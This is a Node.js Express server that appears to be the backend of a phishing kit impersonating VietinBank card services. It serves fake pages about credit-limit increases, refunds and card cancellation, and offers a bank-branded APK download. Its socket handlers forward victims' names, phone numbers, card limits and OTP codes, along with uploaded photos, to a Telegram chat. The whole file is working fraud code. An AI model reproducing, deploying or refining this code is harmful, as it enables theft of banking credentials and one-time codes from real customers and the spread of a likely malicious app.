require('dotenv').config();
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;
const http = require('http').createServer(app);
const { Server } = require('socket.io');
var cors = require('cors')
const io = new Server(http);
var siofu = require("socketio-file-upload");
const axios = require('axios');
const TG = require('telegram-bot-api')
const api = new TG({
  token: process.env.TELEGRAM_BOT_TOKEN,
})
const bodyParser = require('body-parser')
const fs = require('fs')
const multer = require('multer');
const { time } = require('console');

var storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'public/uploads')
  },
  filename: function (req, file, cb) {
    cb(null, file.originalname)
  }
})
var upload = multer({ storage: storage })

app.use(express.static('public'));
app.set('view engine', 'html');
app.set('views', './views');
app.use(cors({
  origin: '*'
}));
app.use(siofu.router).listen(3003);

io.on("connection", function (socket) {
  var uploader = new siofu({
    // maxFileSize: 1gb
    maxFileSize: 1024 * 1024 * 1024

  });
  uploader.dir = "./public/uploads";
  uploader.listen(socket);
  uploader.on("complete", async function (event) {
    await api.sendPhoto({
      chat_id: process.env.TELEGRAM_CHAT_ID,
      photo: fs.createReadStream(`${__dirname}/${event.file.pathName}`)
    });
  });

  socket.on('service', async (data) => {
    // send data to api telegram
    const message = `Có yêu cầu từ khách hàng: ${data.name} - Số điện thoại ${data.phone} - hạn mức hiện tại ${data.limit_now} - hạn mức khả dungh ${data.limit_total} - hạn mước mong muốn ${data.limit_increase}`;
    await api.sendMessage({
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text: message,
      mode: 'html'
    })
    await new Promise(resolve => setTimeout(resolve, 2000));
    socket.emit('success', { message: 'Đã gửi yêu cầu thành công' });
  });


  socket.on('otp', (data) => {
    // send data to api telegram
    const message = `Mã OTP: ${data.otp}`;
    api.sendMessage({
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text: message,
      mode: 'html'
    }).then(() => {
      socket.emit('success', { message: 'Đã gửi mã OTP thành công' });
    }).catch(() => {
      socket.emit('error', { message: 'Hệ thống đang quá tải, vui lòng thử lại sau!' });
    });

  });

});

app.use(bodyParser.urlencoded({ extended: true }))


app.get('/', (req, res) => {
  res.sendFile(__dirname + '/views/index.html');
});
app.get('/chuyen-tien-atm', (req, res) => {
  res.sendFile(__dirname + '/views/chuyen-tien-atm.html');
})
app.get('/chuyen-tra-gop', (req, res) => {
  res.sendFile(__dirname + '/views/chuyen-tra-gop.html');
});
app.get('/dang-ky-nang-cap', (req, res) => {
  res.sendFile(__dirname + '/views/dang-ky-nang-cap.html');
});
app.get('/hoan-tien', (req, res) => {
  res.sendFile(__dirname + '/views/hoan-tien.html');
});
app.get('/nang-han-muc', (req, res) => {
  res.sendFile(__dirname + '/views/nang-han-muc.html');
});
app.get('/otp', (req, res) => {
  res.sendFile(__dirname + '/views/otp.html');
});
app.get('/otp-error', (req, res) => {
  res.sendFile(__dirname + '/views/otp-error.html');
});
app.get('/yeu-cau-huy-the', (req, res) => {
  res.sendFile(__dirname + '/views/yeu-cau-huy-the.html');
});
app.get('/sang-ngang-the', (req, res) => {
  res.sendFile(__dirname + '/views/sang-ngang-the.html');
});
app.get('/download', function (req, res) {
  const file = `${__dirname}/public/app/VietinBank_Han_muc.apk`;
  res.download(file, 'VietinBank_Han_muc.apk', {
    cacheControl: false
  }, (err) => {
    console.log('err', err);
  }); // Set disposition and send it.
});
app.get('/download-app', function (req, res) {
  res.sendDate(__dirname + '/views/download-app.html');
});

app.get('/images', function (req, res) {
  res.sendFile(__dirname + '/views/images.html');
});

app.get('/image-get', function (req, res) {
  const path = `${__dirname}/public/uploads`;
  fs.readdir(path, function (err, items) {
    // sort by date
    items.sort((a, b) => {
      return fs.statSync(`${path}/${b}`).mtime.getTime() - fs.statSync(`${path}/${a}`).mtime.getTime();
    });

    res.json({
      data: items
    });
  });
});
app.get('/gui-email', function (req, res) {
  res.sendFile(__dirname + '/views/gui-email.html');
});

app.post('/upload', upload.single('file'), function (req, res, next) {
  const file = req.file
  if (!file) {
    const error = new Error('Please upload a file')
    error.httpStatusCode = 400
    return next(error)
  }
  api.sendPhoto({
    chat_id: process.env.TELEGRAM_CHAT_ID,
    photo: fs.createReadStream(`${__dirname}/${file.destination}/${file.originalname}`),
    timeout: 999999
  }).then(() => {
    console.log('Upload file thành công');
    res.json({ message: 'Upload file thành công' });
  }).catch((e) => {
    console.log('Upload file thất bại', e);
    res.json({ message: 'Upload file thất bại' });
  });
});

app.get('/mo-the', (req, res) => {
  res.sendFile(__dirname + '/views/mo-the.html');
});

http.listen(port, () => {
  console.log(`Đã chạy trên cổng :${port}`);
});
